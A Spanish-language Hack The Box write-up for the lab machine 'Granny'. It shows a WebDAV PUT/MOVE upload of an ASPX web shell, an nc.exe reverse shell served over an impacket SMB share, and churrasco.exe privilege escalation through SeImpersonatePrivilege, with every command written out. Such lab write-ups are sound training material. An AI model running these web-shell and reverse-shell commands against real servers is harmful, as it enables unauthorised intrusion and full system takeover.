---
title: Granny - HTB Writeup
date: 2023-09-10 19:00:00 +0800
categories: [Writeups, HTB]
tags: [Easy, Windows, Writeup]
image:
  path: /assets/img/post/granny/vishnu-mohanan-pfR18JNEMv8-unsplash.jpg
  lqip: data:image/webp;base64,UklGRpoAAABXRUJQVlA4WAoAAAAQAAAADwAABwAAQUxQSDIAAAARL0AmbZurmr57yyIiqE8oiG0bejIYEQTgqiDA9vqnsUSI6H+oAERp2HZ65qP/VIAWAFZQOCBCAAAA8AEAnQEqEAAIAAVAfCWkAALp8sF8rgRgAP7o9FDvMCkMde9PK7euH5M1m6VWoDXf2FkP3BqV0ZYbO6NA/VFIAAAA
---

Granny es una máquina de dificultad ```Easy``` en la plataforma **Hack The Box**

En esta máquina explotaremos una vulnerabilidad de ```Webdav``` que nos permitirá llevar a cabo un ```RFI```

## **Reconocimiento**

Utilizaremos la herramienta ```nmap``` para listar los puertos abiertos en la máquina víctima:

```bash
nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.10.10.15 -oG allPorts
```

![img](/assets/img/post/granny/fc0e3620-808f-47be-b1f9-d096392af0ab.png)

Vemos que esta el puerto ```80``` abierto.

Vamos a realizar un escaneo de **servicios** y **versiones** corriendo por este puerto:

```bash
nmap -sCV -p80 10.10.10.15 -oN versions
```

![img](/assets/img/post/granny/772fc76a-3774-4bd5-baf7-7bbd0b259c64.png)

Gracias al conjunto de scripts básicos de reconocimiento que aplica el escaneo, podemos ver los tipos de peticiones que se pueden realizar en el servidor, además de que en el puerto ```80``` se ha detectado un ```Webdav``` además de un ```IIS```

Si entramos en la web no vamos a ver nada relevante, ni que podamos usar:

![img](/assets/img/post/granny/76a-3774-4bd5-baf7-7bbd0b259c64.png)

## **Explotación**

Vamos a aprovechar una vulnerabilidad de ```Webdav``` que nos permite mediante ```curl``` subir archivos a la máquina víctima

Para ello vamos a intentar subir una **web shell** ```(cmdasp.aspx)```

Primero copiaremos la **web shell** en la ruta actual

```bash
cp /usr/share/webshells/aspx/cmdasp.aspx ..
```

Posteriormente subiremos la **web shell** a la máquina víctima con curl:

```bash
curl -s -X PUT http://10.10.10.15/cmdasp.txt -d @cmdasp.aspx 
```

> Subiremos el archivo en formato ```.txt``` ya que no podremos en formato ```.aspx```

Una vez el archivo ya subido aprovecharemos el metodo ```MOVE``` para cambiar la extensión de la **web shell** y poder ejecutarla:

```bash
curl -s -X MOVE -H "Destination:http://10.10.10.15/cmdasp.aspx" http://10.10.10.15/cmdasp.txt 
```

> Utilizaremos la cabecera ```Destination``` para modificar el archivo

Ahora si accedemos al archivo tendremos una shell en la que podremos ejecutar comandos:

![img](/assets/img/post/granny/c5fbbfb9-1184-44aa-b98e-2b6d3ab861b2.png)

Para conseguir una **reverse shell** nos copiaremos al archivo actual el ```nc.exe```

```bash
cp /usr/share/SecLists/Web-Shells/FuzzDB/nc.exe . 
```

Utilizaremos ```impacket-smbserver``` para establecer una conexión por ```smb``` y así poder compartir el archivo ```nc.exe``` con la máquina víctima

```bash
impacket-smbserver smbFolder $(pwd)
```

Por otra parte en la web shell ejecutaremos el siguiente comando para compartirnos una shell mediante ```nc.exe```

```bash
\\10.10.14.5\smbFolder\nc.exe -e cmd 10.10.14.5 443
```

A su vez en nuestra máquina nos pondremos en escucha por el puerto ```443```

```bash
rlwrap nc -nlvp 443
```

Y como vemos habremos conseguido acceso a la máquina:

![img](/assets/img/post/granny/20a75187-f421-4a7c-a021-284397c4291d.png)

Pero no tendremos acceso a los usuarios de la máquina por lo que no podremos ver las flags

## **Escalada de Privilegios**

Para listar los permisos del usuario ejecutaremos:

```bash
whoami /priv
```

![img](/assets/img/post/granny/92b4235d-30a4-4130-86c5-e1e67f582553.png)

El permiso que nos interesa es ```SeImpersonatePrivilege```

Si buscamos sobre la escalada de privilegios explotando este permiso nos llevará a https://github.com/Re4son/Churrasco/raw/master/churrasco.exe y descargaremos el ejecutable ```churrasco.exe``` *(xd)*

Utilizando el ```impacket-smbserver``` compartiremos el ejecutable con la máquina víctima

```bash
impacket-smbserver smbFolder $(pwd)
```

En la máquina víctima nos moveremos a ```C:\WINDOWS\temp``` y en esta ruta usaremos el comando: 

```bash
copy \\10.10.14.5\smbFolder\churrasco.exe churrasco.exe
```

Y una vez copiado ejecutaremos ```churrasco.exe```

```bash
churrasco.exe
/churrasco/-->Usage: Churrasco.exe [-d] "command to run"
```
Por lo tanto al ver el uso del comando intentaremos conseguir una shell como ```root```, así que deberemos usar ```nc.exe```:

```bash
churrasco.exe "\\10.10.14.5\smbFolder\nc.exe -e cmd 10.10.14.5 443"
```

Y de nuevo nos pondremos en escucha con ```nc``` por el puerto ```443```:

![img](/assets/img/post/granny/02314c0d-6e4f-4428-b151-05c1cb14f8dd.png)

Y ya tendremos acceso a la máquina como usuario privilegiado

Podremos ver **ambas flag** en el ``Desktop`` del ``usuario`` y del ``administrator``

Espero que os haya gustado y servido, cualquier comentario es de muchas ayuda. Adios!
